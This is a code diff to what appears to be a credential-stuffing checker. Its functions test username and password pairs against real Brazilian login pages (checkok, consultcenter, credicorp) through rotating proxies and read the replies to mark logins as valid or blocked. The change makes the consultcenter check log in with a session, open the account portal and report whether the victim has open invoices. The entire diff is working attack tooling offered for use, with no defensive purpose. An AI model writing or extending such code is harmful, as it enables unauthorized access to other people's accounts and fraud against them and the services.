@@ -142,7 +142,9 @@ def check_checkok(user, pwd):
     return "negado" not in r.text, ""
 
 def check_consultcenter(user, pwd):
-    r = requests.post(
+    s  = requests.Session()
+    px = _get_proxy()
+    r = s.post(
         "https://sistema.consultcenter.com.br/users/login",
         headers={"accept": "text/html,application/xhtml+xml,*/*",
                  "content-type": "application/x-www-form-urlencoded",
@@ -155,10 +157,25 @@ def check_consultcenter(user, pwd):
             f"&data%5BUsuarioLogin%5D%5Busername%5D={user}"
             f"&data%5BUsuarioLogin%5D%5Bpassword%5D={pwd}"
         ),
-        proxies=_get_proxy(), timeout=15,
+        proxies=px, timeout=15,
     )
     html = r.text.lower()
-    return "senha incorretos" not in html and "bloqueado" not in html, ""
+    if "senha incorretos" in html or "bloqueado" in html:
+        return False, ""
+
+    portal = s.get(
+        "https://sistema.consultcenter.com.br/portal",
+        headers={
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "accept-language": "pt-BR,pt;q=0.9",
+            "referer": "https://sistema.consultcenter.com.br/portal",
+            "upgrade-insecure-requests": "1",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
+        },
+        proxies=px, timeout=15,
+    )
+    faturas = "Você possui faturas em aberto!" in portal.text
+    return True, "faturas em aberto" if faturas else "sem faturas em aberto"
 
 def check_credicorp(user, pwd):
     r = requests.post(
